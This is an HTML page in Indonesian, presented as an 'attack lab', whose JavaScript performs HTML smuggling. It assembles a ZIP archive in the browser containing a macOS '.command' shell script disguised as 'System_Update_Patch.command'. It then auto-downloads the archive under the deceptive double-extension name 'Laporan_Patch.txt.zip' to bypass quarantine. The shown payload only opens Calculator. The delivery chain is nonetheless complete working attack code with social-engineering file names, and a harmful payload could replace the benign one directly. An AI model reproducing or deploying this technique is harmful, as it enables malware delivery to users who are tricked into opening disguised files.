<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Chaining: HTML Smuggling + ZIP Quarantine Bypass</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
h2 { margin-bottom: 10px; }
p { margin-bottom: 15px; line-height: 1.5; }
button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
button:hover { background: #b71c1c; }
#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
</style>
</head>
<body>
<div class="panel" id="main-panel">
<h2>Chaining Attack Lab</h2>
<p>Uji coba ekstensi ganda untuk mengunduh file ZIP yang berisi script .command (Bypass Quarantine macOS).</p>

<button id="start-btn" type="button">Mulai Generate File ZIP</button>
<div id="status" role="status">Sistem siap.</div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");

let activeUrls = [];
let isProcessing = false;

const speak = (message) => {
    if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance(message);
        utterance.lang = 'id-ID';
        window.speechSynthesis.speak(utterance);
    }
};

// Helper CRC32 untuk membuat ZIP yang valid
function hitungCRC32(bytes) {
    var crc = 0xFFFFFFFF;
    for (var i = 0; i < bytes.length; i++) {
        crc ^= bytes[i];
        for (var j = 0; j < 8; j++) {
            crc = (crc >>> 1) ^ ((crc & 1) ? 0xEDB88320 : 0);
        }
    }
    return (crc ^ 0xFFFFFFFF) >>> 0;
}

// Membuat file ZIP secara dinamis di dalam browser
function buatZipBypass() {
    // 1. Payload shell script (Kalkulator)
    var shellScript = "#!/bin/bash\n" +
                      "open -a Calculator\n" +
                      "osascript -e 'display notification \"Kalkulator dibuka via ZIP Bypass\" with title \"Chaining Lab\"'\n";
    var contentBytes = new TextEncoder().encode(shellScript);
    var nameBytes = new TextEncoder().encode("System_Update_Patch.command");
    var crc = hitungCRC32(contentBytes);
    
    // 2. Susun Local File Header
    var localHeader = new Uint8Array(30 + nameBytes.length);
    var lh = new DataView(localHeader.buffer);
    lh.setUint32(0, 0x04034b50, true);
    lh.setUint16(4, 20, true);
    lh.setUint16(8, 0, true); // Stored (no compression)
    lh.setUint32(14, crc, true);
    lh.setUint32(18, contentBytes.length, true);
    lh.setUint32(22, contentBytes.length, true);
    lh.setUint16(26, nameBytes.length, true);
    localHeader.set(nameBytes, 30);

    // 3. Susun Central Directory
    var centralDir = new Uint8Array(46 + nameBytes.length);
    var cd = new DataView(centralDir.buffer);
    cd.setUint32(0, 0x02014b50, true);
    cd.setUint16(4, 20, true);
    cd.setUint16(6, 20, true);
    cd.setUint32(16, crc, true);
    cd.setUint32(20, contentBytes.length, true);
    cd.setUint32(24, contentBytes.length, true);
    cd.setUint16(28, nameBytes.length, true);
    cd.setUint32(42, 0, true); // Relative offset
    centralDir.set(nameBytes, 46);

    // 4. Susun End of Central Directory
    var eocd = new Uint8Array(22);
    var eocdView = new DataView(eocd.buffer);
    eocdView.setUint32(0, 0x06054b50, true);
    eocdView.setUint16(8, 1, true);
    eocdView.setUint16(10, 1, true);
    eocdView.setUint32(12, centralDir.length, true);
    eocdView.setUint32(16, localHeader.length + contentBytes.length, true);

    // Gabungkan semua bagian ZIP
    return new Blob([localHeader, contentBytes, centralDir, eocd], { type: 'application/zip' });
}

const triggerInstantDownload = (fileData) => {
    const link = document.createElement("a");
    link.href = fileData.url;
    
    // Ekstensi ganda untuk menipu visual pengguna
    link.download = `Laporan_Patch.txt.zip`; 
    
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
};

startBtn.addEventListener("click", async () => {
    if (isProcessing) return;
    isProcessing = true;
    startBtn.disabled = true;
    statusDiv.textContent = "Membuat file ZIP...";
    
    speak("Membuat paket ZIP.");

    try {
        const zipBlob = buatZipBypass();
        const url = URL.createObjectURL(zipBlob);
        activeUrls.push(url);
        
        triggerInstantDownload({ url: url });
        
        statusDiv.textContent = "File Laporan_Patch.txt.zip berhasil diunduh. Silakan ekstrak file tersebut.";
    } catch(e) {
        statusDiv.textContent = "Gagal: " + e.message;
    }
    
    isProcessing = false;
    startBtn.disabled = false;
});
</script>
</body>
</html>
